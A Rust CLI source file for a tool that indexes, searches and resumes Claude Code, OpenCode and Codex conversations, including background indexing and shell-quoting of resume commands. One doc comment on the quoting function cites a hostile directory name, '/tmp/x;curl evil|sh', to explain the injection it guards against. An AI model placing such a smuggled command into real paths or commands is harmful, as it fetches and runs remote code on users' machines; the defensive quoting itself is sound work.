use clap::{Parser, Subcommand};

use crate::db;
use crate::error::{AppError, Result};
use crate::indexer::claude_code::TranscriptLookup;
use crate::indexer::codex::CodexIndexer;
use crate::indexer::count_conversation_files_on_disk;
use crate::indexer::opencode::{get_opencode_db_path, OpenCodeIndexer};
use crate::indexer::ConversationIndexer;
use crate::search::{
    format_timestamp, ConversationRow, ConversationSearch, GroupedRow, SearchFilter,
    SearchResultRow, SortOrder, TreeNode,
};
use std::collections::HashMap;

/// Source display labels
const SOURCE_LABELS: &[(&str, &str)] = &[("opencode", "[OC]"), ("codex", "[CX]")];

const AUTO_INDEX_TTL_SECS: u64 = 300;
const FULL_INDEX_TTL_SECS: u64 = 86400;
const HOOK_INDEX_TTL_SECS: u64 = 60;
const STAMP_FILE_PATH: &str = "~/.conversation-search/.last-auto-index";
const FULL_STAMP_FILE_PATH: &str = "~/.conversation-search/.last-full-index";
/// stderr of the detached indexer: the hook spawns it with no terminal, so without this
/// file its errors are lost.
const BACKGROUND_LOG_PATH: &str = "~/.conversation-search/background-index.log";
const BACKGROUND_LOG_MAX_BYTES: u64 = 64 * 1024;
const BACKGROUND_LOG_HEADER: &str = "--- background index";

fn source_label(source: &str) -> &str {
    SOURCE_LABELS
        .iter()
        .find(|(k, _)| *k == source)
        .map(|(_, v)| *v)
        .unwrap_or("[CC]")
}

/// The `claude` invocation to put in resume commands.
///
/// Deliberately interpolated unquoted: this is a shell fragment, not a filename, and a user
/// may legitimately set it to `env FOO=1 claude` or add flags. Note the trust boundary --
/// Claude Code lets a project's own `.claude/settings.json` set `env`, so unlike `PATH` this
/// value can come from the repository being searched, and it lands inside a string the docs
/// tell you to `eval`. Treat it as operator-owned configuration, not as data.
fn claude_cmd() -> String {
    std::env::var("CC_CONVERSATION_SEARCH_CMD").unwrap_or_else(|_| "claude".to_string())
}

/// Quote a string for safe interpolation into a POSIX shell command.
///
/// `resume_command` reaches a shell: the picker pipes it into `eval` (README.md documents
/// `eval "$(ai-conversation-search pick)"`, and `bin/ai-conversation-search` takes the
/// field verbatim), and REFERENCE.md documents the JSON field as eval-safe. `project_path`
/// is transcript-derived and unvalidated, so a directory named `/tmp/x;curl evil|sh` would
/// otherwise execute on resume; the benign form of the same bug is a plain space turning
/// `cd /My Projects/app` into a cd somewhere else entirely.
///
/// Conditional rather than unconditional so ordinary paths and UUIDs pass through byte for
/// byte, which keeps the documented examples and the picker's field parsing unchanged.
fn shell_quote(s: &str) -> String {
    fn is_safe(c: char) -> bool {
        c.is_ascii_alphanumeric()
            || matches!(c, '_' | '@' | '%' | '+' | '=' | ':' | ',' | '.' | '/' | '-')
    }
    if !s.is_empty() && s.chars().all(is_safe) {
        return s.to_string();
    }
    // Single quotes suppress every expansion; the one character they cannot contain is `'`
    // itself, spliced back in as `'\''` -- close, escaped quote, reopen.
    format!("'{}'", s.replace('\'', r"'\''"))
}

/// Whether a value can be safely interpolated into a resume command at all.
///
/// Rejects every control character, not just the three that motivate it, because quoting
/// cannot save any of them and there is no value in a path that contains one:
///
/// - NUL terminates the string for the consuming shell mid-quote, leaving the quote open
///   and splicing whatever follows into the command.
/// - Newline, carriage return and tab survive quoting but break the picker's
///   tab-separated, one-row-per-line protocol (`bin/ai-conversation-search` splits fields
///   with `cut`), so a fragment of the command would reach `eval` on its own.
/// - ESC and friends would be rendered straight into a terminal by the picker.
fn is_shell_safe_value(s: &str) -> bool {
    !s.chars().any(|c| c.is_control())
}

/// Envelope for the list-shaped `--json` commands: `search`, `search --group-by-session`,
/// and `list`.
///
/// stdout has to be able to say "there was more than this". A bare array cannot, and the
/// stderr truncation notice is invisible to a consumer reading only stdout -- which is how
/// "not found" gets confused with "not looked for".
///
/// No `count` field: it is `results | length`, and a number sitting next to `truncated`
/// reads as the total match count rather than the returned one.
#[derive(serde::Serialize)]
struct JsonEnvelope {
    results: serde_json::Value,
    truncated: bool,
}

/// The `message_uuid` of a result row.
///
/// Top level for both shapes: `GroupedRow` carries its representative with
/// `#[serde(flatten)]`, so `--group-by-session` rows put the message's own fields at the
/// same level as `match_count`.
fn row_message_uuid(item: &serde_json::Value) -> Option<String> {
    item.get("message_uuid")
        .and_then(|v| v.as_str())
        .map(String::from)
}

/// Attach message bodies to result rows when `--content` was asked for.
///
/// One indexed point lookup per row, so it is only paid for on request. The body is
/// truncated to the same `--content-chars` the human output uses: REFERENCE.md puts the
/// average user message at 3.5K characters, so an uncapped `--limit 50 --content --json` is
/// ~175KB flowing into an agent's context through a skill that says "always use --json".
fn inject_full_content(
    val: &mut serde_json::Value,
    search: &ConversationSearch,
    content_chars: usize,
) {
    let serde_json::Value::Array(arr) = val else {
        return;
    };
    for item in arr.iter_mut() {
        let Some(uuid) = row_message_uuid(item) else {
            continue;
        };
        let Some(body) = search.get_full_message_content(&uuid) else {
            continue;
        };
        let (text, dropped) = truncate_chars(&body, content_chars);
        if let Some(map) = item.as_object_mut() {
            map.insert("full_content".to_string(), serde_json::Value::String(text));
            map.insert(
                "full_content_truncated".to_string(),
                serde_json::Value::Bool(dropped),
            );
        }
    }
}

/// Serialize rows into the envelope, inject `resume_command` + `project_*`, and print.
///
/// All injections run on the inner array *before* wrapping. `inject_resume_command`
/// recurses into arrays and mutates session-bearing objects but does not descend into
/// object values, so running it on the finished envelope would silently do nothing.
fn print_json_envelope<T: serde::Serialize>(
    rows: &T,
    truncated: bool,
    content: Option<(&ConversationSearch, usize)>,
) -> Result<()> {
    let mut results = localize_timestamps(serde_json::to_value(rows)?);
    inject_resume_command(&mut results);
    inject_project_fields(&mut results);
    if let Some((search, content_chars)) = content {
        inject_full_content(&mut results, search, content_chars);
    }
    let envelope = JsonEnvelope { results, truncated };
    println!("{}", serde_json::to_string_pretty(&envelope)?);
    Ok(())
}

/// Recursively convert UTC ISO timestamps to local timezone in JSON values.
fn localize_timestamps(val: serde_json::Value) -> serde_json::Value {
    use chrono::DateTime;

    match val {
        serde_json::Value::Array(arr) => {
            serde_json::Value::Array(arr.into_iter().map(localize_timestamps).collect())
        }
        serde_json::Value::Object(map) => {
            let timestamp_keys = [
                "timestamp",
                "first_message_at",
                "last_message_at",
                "indexed_at",
            ];
            let new_map: serde_json::Map<String, serde_json::Value> = map
                .into_iter()
                .map(|(k, v)| {
                    if timestamp_keys.contains(&k.as_str()) {
                        if let Some(s) = v.as_str() {
                            if s.ends_with('Z') {
                                let cleaned = s.replace('Z', "+00:00");
                                if let Ok(dt) = DateTime::parse_from_rfc3339(&cleaned) {
                                    let local: DateTime<chrono::Local> =
                                        dt.with_timezone(&chrono::Local);
                                    return (k, serde_json::Value::String(local.to_rfc3339()));
                                }
                            }
                        }
                        (k, v)
                    } else {
                        let localized = match v {
                            serde_json::Value::Object(_) | serde_json::Value::Array(_) => {
                                localize_timestamps(v)
                            }
                            other => other,
                        };
                        (k, localized)
                    }
                })
                .collect();
            serde_json::Value::Object(new_map)
        }
        other => other,
    }
}

#[derive(Parser)]
#[command(
    name = "ai-conversation-search",
    about = "Find and resume Claude Code conversations using semantic search"
)]
#[command(version)]
pub struct Cli {
    #[command(subcommand)]
    pub command: Option<Commands>,
}

#[derive(Subcommand)]
pub enum Commands {
    /// Initialize database and index
    Init {
        /// Days of history to index (default: 7)
        #[arg(long, default_value_t = 7)]
        days: i64,
        /// Reinitialize existing database
        #[arg(long)]
        force: bool,
        /// Minimal output
        #[arg(long)]
        quiet: bool,
    },
    /// Index conversations
    Index {
        /// Days back to index (default: 1)
        #[arg(long, default_value_t = 1)]
        days: i64,
        /// Index all conversations
        #[arg(long)]
        all: bool,
        /// Re-read Claude Code transcripts even if unchanged since the last index
        #[arg(long)]
        force: bool,
        /// Minimal output
        #[arg(long)]
        quiet: bool,
    },
    /// Remove already-indexed claude-mem observer sessions
    PruneObserver {
        /// Report what would be removed without changing the database
        #[arg(long)]
        dry_run: bool,
        /// Skip the confirmation prompt (required when stdin is not a terminal)
        #[arg(long)]
        yes: bool,
    },
    /// Fill bigram index entries for messages indexed before migration 10
    BackfillBigram {
        /// Report how many messages lack a bigram entry without changing the database
        #[arg(long)]
        dry_run: bool,
    },
    /// Show index status and health
    Status {
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Search conversations
    Search {
        /// Search query
        query: String,
        /// Exact phrase match (wraps query in quotes for FTS5)
        #[arg(long)]
        exact: bool,
        /// Limit to last N days
        #[arg(long)]
        days: Option<i64>,
        /// Start date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        since: Option<String>,
        /// End date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        until: Option<String>,
        /// Specific date (YYYY-MM-DD, yesterday, today)
        #[arg(long)]
        date: Option<String>,
        /// Filter by project path
        #[arg(long)]
        project: Option<String>,
        /// Filter by repository root (partial match)
        #[arg(long)]
        repo: Option<String>,
        /// Exclude sessions whose working directory partially matches (repeatable)
        #[arg(long)]
        exclude_project: Vec<String>,
        /// Exclude sessions whose repository root partially matches (repeatable)
        #[arg(long)]
        exclude_repo: Vec<String>,
        /// Only sessions started at or under the current directory
        #[arg(long)]
        here: bool,
        /// Filter by source
        #[arg(long, value_parser = ["claude_code", "opencode", "codex"])]
        source: Option<String>,
        /// Max results (default: 20)
        #[arg(long, default_value_t = 20)]
        limit: i64,
        /// Show message bodies instead of snippets
        #[arg(long)]
        content: bool,
        /// Max characters of body to show with --content (default: 300)
        #[arg(long, default_value_t = 300, requires = "content")]
        content_chars: usize,
        /// Show search diagnostics (session/message counts)
        #[arg(long, short = 'v')]
        verbose: bool,
        /// Group results by session (show the top-ranked match per session)
        #[arg(long)]
        group_by_session: bool,
        /// Hide hits on rewound-away branches (off the current leaf path)
        #[arg(long)]
        active_only: bool,
        /// Result order: relevance (bm25) or recent (newest first)
        #[arg(long, value_parser = ["relevance", "recent"], default_value = "relevance")]
        sort: String,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Get context around a message
    Context {
        /// Message UUID
        uuid: String,
        /// Parent depth (default: 3)
        #[arg(long, default_value_t = 3)]
        depth: i32,
        /// Show full content
        #[arg(long)]
        content: bool,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// List recent conversations
    List {
        /// Days back (default: 7)
        #[arg(long)]
        days: Option<i64>,
        /// Start date
        #[arg(long)]
        since: Option<String>,
        /// End date
        #[arg(long)]
        until: Option<String>,
        /// Specific date
        #[arg(long)]
        date: Option<String>,
        /// Max results (default: 20)
        #[arg(long, default_value_t = 20)]
        limit: i64,
        /// Filter by project path (exact match, same as search)
        #[arg(long)]
        project: Option<String>,
        /// Filter by repository root
        #[arg(long)]
        repo: Option<String>,
        /// Exclude sessions whose working directory partially matches (repeatable)
        #[arg(long)]
        exclude_project: Vec<String>,
        /// Exclude sessions whose repository root partially matches (repeatable)
        #[arg(long)]
        exclude_repo: Vec<String>,
        /// Only sessions started at or under the current directory
        #[arg(long)]
        here: bool,
        /// Filter by source
        #[arg(long, value_parser = ["claude_code", "opencode", "codex"])]
        source: Option<String>,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Show conversation tree
    Tree {
        /// Session ID
        session_id: String,
        /// Only show messages from this role
        #[arg(long, value_parser = ["user", "assistant"])]
        role: Option<String>,
        /// Drop tool-call and tool-result nodes
        #[arg(long)]
        no_tools: bool,
        /// Return a flat list instead of a nested tree
        #[arg(long)]
        flat: bool,
        /// Show message bodies instead of summaries only
        #[arg(long)]
        content: bool,
        /// Max characters of each message body to show
        #[arg(long, default_value_t = 300, requires = "content", value_parser = clap::value_parser!(u64).range(1..))]
        content_chars: u64,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Get session resumption commands
    Resume {
        /// Message UUID
        uuid: String,
    },
    /// Show resume target as structured spec without starting it
    ResumeSpec {
        /// Session ID (full, unique prefix, or oc:/codex: prefixed)
        session_id: String,
        /// Output as JSON
        #[arg(long)]
        json: bool,
    },
    /// Preview the tail of a session with optional query highlight (read-only)
    Preview {
        /// Session ID (full, unique prefix, or oc:/codex: prefixed)
        session_id: String,
        /// Highlight this phrase (single phrase, ASCII case-insensitive) and list matching message UUIDs in JSON
        #[arg(long)]
        query: Option<String>,
        /// Show the last N messages (default: 30)
        #[arg(long, default_value_t = 30, value_parser = clap::value_parser!(u64).range(1..))]
        messages: u64,
        /// Output as JSON (tree-compatible envelope plus query/matches/project_*)
        #[arg(long)]
        json: bool,
        /// Disable ANSI highlight even on a TTY
        #[arg(long)]
        no_color: bool,
        /// Max characters of each message body to show
        #[arg(long, default_value_t = 300, value_parser = clap::value_parser!(u64).range(1..))]
        content_chars: u64,
    },
    /// Trigger background indexing (for use as a Claude Code hook)
    Hook,
}

fn index_other_sources(days_back: Option<i64>, quiet: bool) {
    let oc_path = db::expand_path(&get_opencode_db_path());
    if oc_path.exists() {
        if !quiet {
            eprintln!("\nIndexing OpenCode conversations...");
        }
        let oc = OpenCodeIndexer::new(None, None, quiet);
        if let Err(e) = oc.scan_and_index(days_back) {
            eprintln!("Warning: failed to index OpenCode conversations: {}", e);
        }
    }

    let codex_dir = db::expand_path("~/.codex/sessions");
    if codex_dir.exists() {
        if !quiet {
            eprintln!("\nIndexing Codex CLI conversations...");
        }
        let cx = CodexIndexer::new(None, None, quiet);
        if let Err(e) = cx.scan_and_index(days_back) {
            eprintln!("Warning: failed to index Codex CLI conversations: {}", e);
        }
    }
}

/// Analyze the rows the FTS triggers queued for the bigram table during this run,
/// including rows written by older binaries, which queue but never drain. A failure only delays 2-char search for those
/// rows: the queue keeps them for the next run.
fn drain_bigram_queue(indexer: &ConversationIndexer) {
    if let Err(e) = crate::schema::drain_bigram_pending(indexer.connection()) {
        eprintln!("Warning: bigram queue drain failed: {}", e);
    }
}

fn touch_stamp_file() {
    touch_stamp_at(&db::expand_path(STAMP_FILE_PATH));
}

fn touch_stamp_at(stamp_path: &std::path::Path) {
    if let Some(parent) = stamp_path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let _ = std::fs::write(stamp_path, "");
}

/// Returns true if the stamp file is stale (older than TTL or missing).
fn is_stamp_stale(stamp_path: &std::path::Path, ttl_secs: u64) -> bool {
    match std::fs::metadata(stamp_path) {
        Ok(meta) => match meta.modified() {
            Ok(mtime) => {
                mtime.elapsed().unwrap_or_default() >= std::time::Duration::from_secs(ttl_secs)
            }
            Err(_) => true,
        },
        Err(_) => true,
    }
}

/// Spawn a background index process if the stamp file is stale.
/// All errors are silently ignored — this must never block or fail the caller.
fn maybe_background_index() {
    let _ = try_background_index(None);
}

/// TTL for the Stop-hook trigger.
///
/// Shorter than the shared 300s because `search`, `tree` and `list` all touch the same
/// stamp: at 300s, an agent that searched during the session leaves the hook a no-op for
/// the session it most needs to index. Not 0, though -- Stop fires on every turn, not only
/// at session end, so an always-stale stamp would sweep every project directory each turn
/// and leave overlapping indexers contending for one SQLite file.
///
/// Takes the raw value rather than reading the environment so it stays assertable without
/// mutating process-wide state, which parallel tests share.
fn hook_index_ttl_secs(raw: Option<String>) -> u64 {
    raw.and_then(|v| v.parse::<u64>().ok())
        .unwrap_or(HOOK_INDEX_TTL_SECS)
}

fn try_background_index(incremental_ttl_override: Option<u64>) -> Option<()> {
    let stamp_path = db::expand_path(STAMP_FILE_PATH);
    let full_stamp_path = db::expand_path(FULL_STAMP_FILE_PATH);

    let ttl_secs = incremental_ttl_override.unwrap_or_else(|| {
        std::env::var("CONVERSATION_SEARCH_INDEX_TTL")
            .ok()
            .and_then(|v| v.parse::<u64>().ok())
            .unwrap_or(AUTO_INDEX_TTL_SECS)
    });

    let full_ttl_secs = std::env::var("CONVERSATION_SEARCH_FULL_INDEX_TTL")
        .ok()
        .and_then(|v| v.parse::<u64>().ok())
        .unwrap_or(FULL_INDEX_TTL_SECS);

    let needs_full = is_stamp_stale(&full_stamp_path, full_ttl_secs);
    let needs_incremental = is_stamp_stale(&stamp_path, ttl_secs);

    if !needs_full && !needs_incremental {
        return Some(());
    }

    // Touch stamps before spawning to reduce (not eliminate) concurrent spawns.
    // TOCTOU race is possible but benign: SQLite WAL handles concurrent index writes safely.
    touch_stamp_at(&stamp_path);
    if needs_full {
        touch_stamp_at(&full_stamp_path);
    }

    let exe = std::env::current_exe().ok()?;
    let mut cmd = std::process::Command::new(exe);
    if needs_full {
        cmd.args(["index", "--all", "--quiet"]);
    } else {
        cmd.args(["index", "--days", "1", "--quiet"]);
    }
    cmd.stdout(std::process::Stdio::null());
    let log = open_background_log(&db::expand_path(BACKGROUND_LOG_PATH), needs_full);
    let mut spawn_err_log = log.as_ref().and_then(|f| f.try_clone().ok());
    cmd.stderr(log.map_or_else(std::process::Stdio::null, std::process::Stdio::from));
    cmd.stdin(std::process::Stdio::null());

    if let Err(e) = cmd.spawn() {
        if let Some(f) = spawn_err_log.as_mut() {
            use std::io::Write;
            let _ = writeln!(f, "Error: failed to start background index: {}", e);
        }
    }
    Some(())
}

/// Open the background-index log for appending, after writing this run's header.
///
/// Append rather than truncate-per-run: spawns overlap (several sessions, several
/// installed versions), and truncating under a running child would punch a hole in its
/// output and erase the failure `status` is meant to surface. Rotation renames instead,
/// so a child still writing keeps its output in `.1`; `status` then misses it until the
/// next run, accepted at one rotation per 64KB.
fn open_background_log(path: &std::path::Path, full: bool) -> Option<std::fs::File> {
    use std::io::Write;
    if std::fs::metadata(path).is_ok_and(|m| m.len() > BACKGROUND_LOG_MAX_BYTES) {
        let _ = std::fs::rename(path, path.with_extension("log.1"));
    }
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .ok()?;
    let _ = writeln!(
        file,
        "{} {} v{} ({})",
        BACKGROUND_LOG_HEADER,
        chrono::Local::now().format("%Y-%m-%d %H:%M:%S"),
        env!("CARGO_PKG_VERSION"),
        if full { "full" } else { "incremental" }
    );
    Some(file)
}

/// The header line of the most recent run in the background-index log and that run's
/// failure lines, or `None` when it reported none.
///
/// A heuristic: lines are matched by wording, and overlapping runs can interleave
/// under the last header.
fn last_background_failures(log: &str) -> Option<(&str, Vec<&str>)> {
    let last_run = log.rfind(BACKGROUND_LOG_HEADER).map_or(log, |i| &log[i..]);
    let mut lines = last_run.lines();
    let header = lines.next().unwrap_or_default();
    let failures: Vec<&str> = lines
        .filter(|l| {
            let l = l.to_ascii_lowercase();
            l.contains("error") || l.contains("failed") || l.contains("panicked")
        })
        .collect();
    (!failures.is_empty()).then_some((header, failures))
}

/// Normalise `session_id` into the stem a Claude Code transcript would carry, or `None`
/// when it cannot name one.
///
/// Split out from `index_single_session` so the rejection rules are directly assertable:
/// inside that function every rejected input merely produces `false`, which a broken guard
/// would also produce, making the guard untestable through the return value alone.
///
/// Lowercased because SQLite `LIKE` resolves ids case-insensitively while the filenames on
/// disk are lowercase -- an uppercase id would resolve in the DB but never match here.
fn transcript_lookup_key(session_id: &str) -> Option<String> {
    let id = session_id.to_ascii_lowercase();
    // Guards the directory sweep, which is far too expensive to run on arbitrary input.
    // This also covers OpenCode (`oc:`) and Codex (`codex:`) ids, which carry a source
    // prefix and do not live in the ~/.claude*/projects/<project>/<uuid>.jsonl layout at
    // all: their `:` is neither a hex digit nor a dash, so they never reach the sweep.
    if id.len() < 8 || !id.chars().all(|c| c.is_ascii_hexdigit() || c == '-') {
        return None;
    }
    Some(id)
}

/// Why a targeted index did not produce a readable session.
///
/// Distinct variants rather than a bool: every one of these used to surface as
/// "Conversation X not found", so a corrupt database, a locked index and a mistyped id were
/// indistinguishable -- and only the last of those is the user's fault.
enum TargetedIndex {
    /// The transcript was handed to the indexer without error. This does NOT promise rows
    /// were written: observer, summarizer and empty transcripts are skipped inside.
    Handed,
    /// Not an id this layout can hold (wrong shape, or an OpenCode/Codex source prefix).
    NotAClaudeCodeId,
    /// No transcript on disk carries that id.
    TranscriptNotFound,
    /// Several transcripts share the prefix; guessing one would show the wrong session.
    AmbiguousPrefix(usize),
    /// The index or the transcript could not be read or written.
    Failed(String),
}

/// Index just the transcript for `session_id`, synchronously, into `db_path`.
///
/// Why not reuse `maybe_background_index`: that path spawns a detached process and is
/// TTL-debounced, so it can never satisfy a lookup happening in this same process -- which
/// is exactly the "session that ended a minute ago" case this exists for.
///
fn index_single_session(
    db_path: &str,
    session_id: &str,
    project_roots: Option<&[std::path::PathBuf]>,
) -> TargetedIndex {
    let Some(id) = transcript_lookup_key(session_id) else {
        return TargetedIndex::NotAClaudeCodeId;
    };
    // Never *create* a database from a read path: ConversationIndexer::new opens read-write
    // and runs init_schema, so on a missing DB `tree` would silently build a whole index.
    // Migrating an existing one is accepted -- any other command would have done it anyway.
    if !db::expand_path(db_path).exists() {
        return TargetedIndex::Failed(format!("no index database at {}", db_path));
    }

    let mut indexer = match ConversationIndexer::new(db_path, true) {
        Ok(indexer) => indexer,
        Err(e) => return TargetedIndex::Failed(e.to_string()),
    };
    // A stale claude_code_sync_state row would otherwise short-circuit the re-read and
    // leave this a silent no-op. One file is sub-second, so re-reading is affordable.
    indexer.set_force(true);

    // Reuse the real scanner rather than walking directories here: it already knows the
    // transcripts sit two levels below the discovered roots, and it carries the observer,
    // summarizer and agent-* skips. No date cutoff -- a session old enough to have missed
    // the window is precisely one that was never indexed.
    // `project_roots` exists so a test can point this at a temp tree instead of $HOME.
    // Discovery reads the home directory, which a test cannot supply without mutating
    // process-wide state -- the same reason `scan_project_dirs` is a separate function.
    let discovered;
    let roots = match project_roots {
        Some(roots) => roots,
        None => {
            discovered = indexer.discover_project_dirs();
            &discovered
        }
    };
    let files = indexer.scan_project_dirs(roots, None);
    let path = match crate::indexer::claude_code::find_session_transcript(&files, &id) {
        TranscriptLookup::Found(path) => path,
        TranscriptLookup::NotFound => return TargetedIndex::TranscriptNotFound,
        TranscriptLookup::Ambiguous(n) => return TargetedIndex::AmbiguousPrefix(n),
    };

    match indexer.index_conversation(&path) {
        Ok(()) => TargetedIndex::Handed,
        Err(e) => TargetedIndex::Failed(format!("{}: {}", path.display(), e)),
    }
}

pub fn run(cli: Cli) -> Result<()> {
    // Before anything spawns the detached indexer, whose stderr goes to /dev/null. The
    // indexer is the process that reads this variable, so a warning raised there is
    // invisible to the person who set it -- which is the whole failure being warned about.
    crate::indexer::warn_on_unrecognised_observer_flag();

    match cli.command {
        None => {
            // Print help
            use clap::CommandFactory;
            Cli::command().print_help().ok();
            std::process::exit(1);
        }
        Some(Commands::Init { days, force, quiet }) => cmd_init(days, force, quiet),
        Some(Commands::Index {
            days,
            all,
            force,
            quiet,
        }) => cmd_index(days, all, force, quiet),
        Some(Commands::PruneObserver { dry_run, yes }) => cmd_prune_observer(dry_run, yes),
        Some(Commands::BackfillBigram { dry_run }) => cmd_backfill_bigram(dry_run),
        Some(Commands::Status { json }) => cmd_status(json),
        Some(Commands::Search {
            query,
            exact,
            days,
            since,
            until,
            date,
            project,
            repo,
            exclude_project,
            exclude_repo,
            here,
            source,
            limit,
            content,
            content_chars,
            verbose,
            group_by_session,
            active_only,
            sort,
            json,
        }) => {
            let effective_query = if exact {
                // Sanitize quotes to prevent FTS5 operator injection
                format!("\"{}\"", query.replace('"', ""))
            } else {
                query
            };
            let filter = SearchFilter {
                days_back: days,
                since: since.as_deref(),
                until: until.as_deref(),
                date: date.as_deref(),
                limit,
                project_path: project.as_deref(),
                repo: repo.as_deref(),
                source: source.as_deref(),
                // clap's value_parser restricts this to the two known values.
                sort: match sort.as_str() {
                    "recent" => SortOrder::Recent,
                    _ => SortOrder::Relevance,
                },
            };
            let post = PostFilter {
                exclude_project,
                exclude_repo,
                here: here.then(PostFilter::current_dir).flatten(),
            };
            cmd_search(
                &effective_query,
                &filter,
                &post,
                content,
                content_chars,
                verbose,
                group_by_session,
                active_only,
                json,
            )
        }
        Some(Commands::Context {
            uuid,
            depth,
            content,
            json,
        }) => cmd_context(&uuid, depth, content, json),
        Some(Commands::List {
            days,
            since,
            until,
            date,
            limit,
            project,
            repo,
            exclude_project,
            exclude_repo,
            here,
            source,
            json,
        }) => {
            let filter = SearchFilter {
                days_back: days,
                since: since.as_deref(),
                until: until.as_deref(),
                date: date.as_deref(),
                limit,
                project_path: project.as_deref(),
                repo: repo.as_deref(),
                source: source.as_deref(),
                // `list` has no query, so there is no relevance to rank by.
                sort: SortOrder::Recent,
            };
            let post = PostFilter {
                exclude_project,
                exclude_repo,
                here: here.then(PostFilter::current_dir).flatten(),
            };
            cmd_list(&filter, &post, json)
        }
        Some(Commands::Tree {
            session_id,
            role,
            no_tools,
            flat,
            content,
            content_chars,
            json,
        }) => cmd_tree(
            &session_id,
            &TreeOpts {
                role,
                no_tools,
                flat,
                content,
                content_chars: content_chars as usize,
                json,
            },
        ),
        Some(Commands::Resume { uuid }) => cmd_resume(&uuid),
        Some(Commands::ResumeSpec { session_id, json }) => cmd_resume_spec(&session_id, json),
        Some(Commands::Preview {
            session_id,
            query,
            messages,
            json,
            no_color,
            content_chars,
        }) => cmd_preview(
            &session_id,
            query.as_deref(),
            messages as usize,
            json,
            no_color,
            content_chars as usize,
        ),
        Some(Commands::Hook) => cmd_hook(),
    }
}

fn cmd_init(days: i64, force: bool, quiet: bool) -> Result<()> {
    if !quiet {
        eprintln!("Conversation Search - Initializing");
        eprintln!("{}", "=".repeat(50));
    }

    let db_path = db::default_db_path();

    if db_path.exists() && !force {
        if !quiet {
            eprintln!("\u{2713} Database already exists: {}", db_path.display());
            eprintln!("  Use --force to reinitialize");
        }
        return Ok(());
    }

    if !quiet {
        eprintln!("Creating database: {}", db_path.display());
    }

    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, quiet)?;

    if !quiet {
        eprintln!("\nIndexing conversations from last {} days...", days);
    }

    let files = indexer.scan_conversations(Some(days));

    if files.is_empty() {
        if !quiet {
            eprintln!("  No conversations found");
        }
    } else {
        if !quiet {
            eprintln!("  Found {} conversation files", files.len());
        }
        let total = files.len();
        for (i, conv_file) in files.into_iter().enumerate() {
            if !quiet {
                eprint!(
                    "  [{}/{}] {}\r",
                    i + 1,
                    total,
                    conv_file
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_default()
                );
            }
            if let Err(e) = indexer.index_conversation(&conv_file) {
                eprintln!("\n  Error indexing {}: {}", conv_file.display(), e);
            }
        }
    }

    index_other_sources(Some(days), quiet);
    drain_bigram_queue(&indexer);
    touch_stamp_file();
    touch_stamp_at(&db::expand_path(FULL_STAMP_FILE_PATH));

    if !quiet {
        eprintln!("\n\u{2713} Initialization complete!");
        eprintln!("  Database: {}", db_path.display());
        eprintln!("\nNext steps:");
        eprintln!("  \u{2022} Search conversations: ai-conversation-search search '<query>'");
        eprintln!("  \u{2022} List recent: ai-conversation-search list");
        eprintln!("  \u{2022} Re-index: ai-conversation-search index");
    }

    Ok(())
}

fn cmd_index(days: i64, all: bool, force: bool, quiet: bool) -> Result<()> {
    let mut indexer = ConversationIndexer::new(db::DEFAULT_DB_PATH, quiet)?;
    indexer.set_force(force);

    // Self-heal any conversations rows left orphaned by the pre-0.12.1 bug
    // (message_count > 0 but no messages in DB). Cheap LEFT JOIN; in steady
    // state returns 0 and stays silent. Err is logged even under --quiet so
    // a corrupted DB doesn't fail invisibly.
    match indexer.repair_orphan_conversations() {
        Ok(0) => {}
        Ok(n) => {
            if !quiet {
                eprintln!(
                    "Repaired {} orphan conversation row(s) — will re-index from JSONL",
                    n
                );
            }
        }
        Err(e) => {
            eprintln!("Warning: orphan repair failed: {}", e);
        }
    }

    let days_back = if all { None } else { Some(days) };
    let files = indexer.scan_conversations(days_back);

    if files.is_empty() {
        if !quiet {
            eprintln!("No Claude Code conversations to index");
        }
    } else {
        if !quiet {
            eprintln!("Indexing {} Claude Code conversations...", files.len());
        }
        let total = files.len();
        for (i, conv_file) in files.into_iter().enumerate() {
            if !quiet {
                eprint!(
                    "[{}/{}] {}\r",
                    i + 1,
                    total,
                    conv_file
                        .file_name()
                        .map(|n| n.to_string_lossy().to_string())
                        .unwrap_or_default()
                );
            }
            // Even under --quiet: the background indexer runs quiet, and its stderr is
            // the only record that a write failed.
            if let Err(e) = indexer.index_conversation(&conv_file) {
                eprintln!("\nError indexing {}: {}", conv_file.display(), e);
            }
        }
        if !quiet {
            eprintln!("\u{2713} Indexed Claude Code conversations");
        }
    }

    let other_days = if all { Some(9999i64) } else { Some(days) };
    index_other_sources(other_days, quiet);
    drain_bigram_queue(&indexer);
    touch_stamp_file();
    if all {
        touch_stamp_at(&db::expand_path(FULL_STAMP_FILE_PATH));
    }

    Ok(())
}

/// Decide whether an irreversible delete may proceed.
///
/// A non-TTY without `--yes` is refused rather than assumed. This command is reachable from
/// scripts and from agent shells, which never have a terminal, and "nobody answered" must
/// not read as "yes" for something that cannot be undone.
///
/// Only "y"/"yes" mean yes -- a prefix match would accept "yesterday", and treating an
/// empty line as consent would make a stray Enter destructive.
///
/// `is_terminal` and `reader` are parameters rather than reads of the real stdin so both
/// branches are reachable in tests. Probing `std::io::stdin()` directly made the outcome
/// depend on how `cargo test` was launched: green under CI, and a blocking `read_line` on a
/// developer's terminal.
fn confirm_prune(
    count: i64,
    assume_yes: bool,
    is_terminal: bool,
    reader: &mut impl std::io::BufRead,
) -> Result<bool> {
    use std::io::Write;

    if assume_yes {
        return Ok(true);
    }
    if !is_terminal {
        eprintln!(
            "Refusing to remove {} session(s) without confirmation.",
            count
        );
        eprintln!("stdin is not a terminal. Re-run with --yes, or --dry-run to preview.");
        return Err(AppError::General(
            "prune-observer requires --yes when stdin is not a terminal".to_string(),
        ));
    }

    eprint!(
        "Remove {} observer session(s)? This cannot be undone. [y/N] ",
        count
    );
    let _ = std::io::stderr().flush();
    let mut answer = String::new();
    reader.read_line(&mut answer)?;
    Ok(matches!(
        answer.trim().to_ascii_lowercase().as_str(),
        "y" | "yes"
    ))
}

